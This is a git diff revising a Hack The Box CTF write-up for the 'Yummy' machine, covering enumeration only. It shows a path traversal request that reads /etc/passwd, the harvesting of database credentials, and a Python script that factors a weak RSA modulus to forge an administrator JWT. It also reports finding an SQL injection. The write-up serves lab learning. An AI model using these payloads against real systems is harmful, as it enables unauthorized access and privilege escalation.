@@ -1,75 +1,49 @@
-### Part 1: Enumeration
+# Part 1: Enumeration
 
-I am starting with nmap scan
+Starting with an **Nmap scan**:
 
 ![NMAP](/static/writeups/HTB-S-VI/yummy/1.png)
 
-port 22 and 80 are open, i started with website and found a site called yummy.htb, after adding it to `/etc/hosts` i fired up dirsearch and got nothing so, i started tinkering with its functionality and found local file traversal vulnerability in save icalendar functionality which is accessible after booking a table:
+Nmap reveals that ports 22 and 80 are open. I began exploring the website, `yummy.htb`. After adding this entry to `/etc/hosts`, I used `dirsearch` but found nothing significant. However, I discovered a **local file traversal vulnerability** in the "save iCalendar" functionality, accessible after booking a table.
 
-![NMAP](/static/writeups/HTB-S-VI/yummy/2.png)
+![LFI Vulnerability](/static/writeups/HTB-S-VI/yummy/2.png)
 
-After intercepting request with burpsuite, i send it with
+Intercepting the request with **Burp Suite**, I tested a payload to access `/etc/passwd`:
 
 ```
 GET /export/../../../../../etc/passwd
 ```
 
-and got content of `/etc/passwd`:
+This response returned the contents of `/etc/passwd`:
 
-![NMAP](/static/writeups/HTB-S-VI/yummy/3.png)
+![Passwd File](/static/writeups/HTB-S-VI/yummy/3.png)
 
-As i can download any file within my access control, i begin to search for different file that may give some more information or way to get a shell and finally found something interesting in `/etc/crontab`
+Since I could access any files, I searched for valuable files and found something interesting in `/etc/crontab`:
 
-![NMAP](/static/writeups/HTB-S-VI/yummy/4.png)
+![Crontab](/static/writeups/HTB-S-VI/yummy/4.png)
+![Crontab Details](/static/writeups/HTB-S-VI/yummy/5.png)
 
-![NMAP](/static/writeups/HTB-S-VI/yummy/5.png)
+### Exploring `/data/scripts`
 
-Let's read the scripts in `data/scripts`
+I explored the `data/scripts` directory and found `table_cleanup.sh`, which cleans tables in MySQL. It also contains credentials for the database:
 
-`table_cleanup.sh` is cleaning the tables in mysql and there is a `credential` for database.
+![Cleanup Script](/static/writeups/HTB-S-VI/yummy/16.png)
 
-![NMAP](/static/writeups/HTB-S-VI/yummy/16.png)
+In `dbmonitor.sh`, I found a script that checks if the MySQL service is down and restarts it if needed:
 
-let's see dbmonitor.sh,
+![DB Monitor Script](/static/writeups/HTB-S-VI/yummy/18.png)
 
-![NMAP](/static/writeups/HTB-S-VI/yummy/18.png)
+`app_backup.sh` goes to `/var/www/` directory and zips content of `/opt/app` as `backupapp.zip` file:
 
-It checks if `mysql service` is down and fixes using a fixing script in `/data/scripts/`
+![Backup App](/static/writeups/HTB-S-VI/yummy/7.png)
 
-Checking `backupapp.zip`
+Extracting `backupapp.zip` provided the web application’s source code. Here are the files:
 
-![NMAP](/static/writeups/HTB-S-VI/yummy/7.png)
+![Extracted Files](/static/writeups/HTB-S-VI/yummy/9.png)
 
-`app_backup.sh` is removing the backupapp.zip in `web` folder and moves the current `web` folder to `/opt/app` as zip.Let's download the `backupapp.zip` from `/var/www/` and extract it
-
-![NMAP](/static/writeups/HTB-S-VI/yummy/8.png)
-
-These are the file in backupapp.zip
-
-![NMAP](/static/writeups/HTB-S-VI/yummy/9.png)
-
-Unzipping the `backupapp.zip` gives the source code for web application. `App.py` has same database credentials as cleanup.sh
+In `app.py`, I located the same database credentials as those in `cleanup.sh`:
 
 ```
-from flask import Flask, request, send_file, render_template, redirect, url_for, flash, jsonify, make_response
-import tempfile
-import os
-import shutil
-from datetime import datetime, timedelta, timezone
-from urllib.parse import quote
-from ics import Calendar, Event
-from middleware.verification import verify_token
-from config import signature
-import pymysql.cursors
-from pymysql.constants import CLIENT
-import jwt
-import secrets
-import hashlib
-
-app = Flask(__name__, static_url_path='/static')
-temp_dir = ''
-app.secret_key = secrets.token_hex(32)
-
 db_config = {
     'host': '127.0.0.1',
     'user': 'chef',
@@ -77,96 +51,96 @@ db_config = {
     'database': 'yummy_db',
     'cursorclass': pymysql.cursors.DictCursor,
     'client_flag': CLIENT.MULTI_STATEMENTS
-
 }
-
-access_token = ''
-
-@app.route('/login', methods=['GET','POST'])
-def login():
 ```
 
-searching inside the `/config` folder, there is `signature.py` file which is used to create the session tokens in web app.
+### JWT Vulnerability
 
-![NMAP](/static/writeups/HTB-S-VI/yummy/11.png)
+In the `config` folder, the `signature.py` file revealed session token generation logic.
 
-The major problem in this session tokens is when the jwt token is decoded from base64, it reveals the n value of RSA encryption:
+Code:
 
-![NMAP](/static/writeups/HTB-S-VI/yummy/12.png)
+```
+#!/usr/bin/python3
 
-just by changing role to admin doesnot work because we are changing the signature, when a JWT is created, the signature is generated by hashing the payload and header with secret key. This signature acts as a seal for the token, ensuring it hasn’t been tampered with.
+from Crypto.PublicKey import RSA
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import serialization
+import sympy
 
-But, as we know n value with a few modification on signature.py we can create admin token
 
-I used this python code:
+# Generate RSA key pair
+q = sympy.randprime(2**19, 2**20)
+n = sympy.randprime(2**1023, 2**1024) * q
+e = 65537
+p = n // q
+phi_n = (p - 1) * (q - 1)
+d = pow(e, -1, phi_n)
+key_data = {'n': n, 'e': e, 'd': d, 'p': p, 'q': q}
+key = RSA.construct((key_data['n'], key_data['e'], key_data['d'], key_data['p'], key_data['q']))
+private_key_bytes = key.export_key()
+
+private_key = serialization.load_pem_private_key(
+    private_key_bytes,
+    password=None,
+    backend=default_backend()
+)
+public_key = private_key.public_key()
+```
+
+Upon decoding the JWT token in base64, the `n` value of the RSA encryption was exposed:
+
+![JWT Decoding](/static/writeups/HTB-S-VI/yummy/12.png)
+
+Modifying the role to `administrator` was initially unsuccessful due to signature verification, which hashes the payload and header with a secret key. However, with access to the `n` value, I modified `signature.py` to create an admin token.
+
+Using the following Python script, I generated a modified JWT with administrator privileges:
 
 ```
 from Crypto.PublicKey import RSA
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import serialization
 import sympy
-import jwt  # This should now work as we've imported pyjwt correctly
+import jwt
 import base64
 
 # Your session token
-original_jwt = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.
-eyJlbWFpbCI6InN1Y2VAeXVtbXkuaHRiIiwicm9sZSI6ImN1c3RvbWVyXzk3MTMwNGU0IiwiaWF0IjoxNzI4NDA1NzQ3LCJleHAiOjE3Mjg0MDkzNDcsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiMTYwOTAxMDQy
-MjM0OTI0MDM3MjI1NTU2MDMzNzk5ODMyNTAzNzMzOTcxMzYxMzk5NzY1NDkzOTA5ODkyMTkwOTYzMzE1MTk2MjAwNTIzNTAyMzgwOTk1MzQ1OTg1OTQwMTAxMTY1ODg1NTc0MTg5NDAyMjY1ODI4ODk2MDI1OTI2
-MjU3Njk0NzM1MjU4MzMxOTI2ODIwMzU5OTQ5MjYyMzU1NTE5MDM2NTQ1NDQ0MjI5MzM0Mzg0Nzk5ODEwOTA1MDM3NTk0OTAyNDYxMTI4OTcxODI5NzIwNzQ1MDM1NjQyODI1MTkwOTAwMzE1OTEwNzcxMjM2NzU1
-NjcxMTgxMjk2MjE5MzkyODQ3ODc4OTIzMDY4ODgxNjIyOTE1NjM2NzQ4MDcyNjUzOTUwMzcyMjA4Nzc2NzU5MTIzIiwiZSI6NjU1Mzd9fQ.
-C48zA1-mU_GYLLpYhIkE9aT_QKtZ3qe7Jj3pk0yMrEtbDw3Shg6IbOORaFr8ID0N9sDcc-KMd5ZQ0fbEuhMnXDtCT4HwMojeeHOQI68UeQFZ80Po3aUCcANcs7OHswndGTc2mtt3O5F95koPSVZWj5K3bztTVCgc
-o2H-OxmC78Uaz1A"
-s = original_jwt.split(".")[1].encode()
-s = base64.b64decode(s + b'=' * (-len(s) % 4)).decode()
+original_jwt = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...<trimmed>"
+
+# Decoding and modifying the JWT
 n = int(s.split('"n":')[1].split('"')[1])
-
-# Known public exponent
 e = 65537
-
-# Factor n to find p and q
 factors = sympy.factorint(n)
 p, q = list(factors.keys())
-
-# Compute φ(n)
 phi_n = (p - 1) * (q - 1)
-
-# Compute d
 d = pow(e, -1, phi_n)
-
-# Construct the private key for signing
 key = RSA.construct((n, e, d, p, q))
 signing_key = key.export_key()
 
-# Decode the JWT
+# Modifying role to administrator
 decoded_payload = jwt.decode(
     original_jwt,
     signing_key,
     algorithms=["RS256"],
-    options={"verify_signature": False}  # Skips verification of the token signature
+    options={"verify_signature": False}
 )
-
-# Modify the role to 'administrator'
 decoded_payload['role'] = 'administrator'
-
-# Re-encode the JWT with the updated payload
 new_jwt = jwt.encode(decoded_payload, signing_key, algorithm='RS256')
-
-print("Modified JWT with administrator role:")
-print(new_jwt)
+print("Modified JWT with administrator role:", new_jwt)
 ```
 
-after copying new token generated from above script and using it in x-auth token in /admindashboard, i got admin panel
+Using the new token in `x-auth` for `/admindashboard`, I accessed the admin panel:
 
-![NMAP](/static/writeups/HTB-S-VI/yummy/13.png)
+![Admin Panel](/static/writeups/HTB-S-VI/yummy/13.png)
 
-there are no any fancy functionality in this panel apart from canceling appointment and a search functionality. so i am testing search for different vulnerabilities.
+The admin panel contained limited functionality, but I identified an error-based SQL injection vulnerability in the search function.
 
-Using ghauri i find that search is vulnerable to error-based blind sql injection
+![SQL Injection](/static/writeups/HTB-S-VI/yummy/14.png)
 
-![NMAP](/static/writeups/HTB-S-VI/yummy/14.png)
+With this SQL injection vulnerability, I planned to escalate further.
 
-Remember there was another mysql cronjob running
+---
 
 ### Part 2: Foothold
 
-being updated
+**To be updated...**
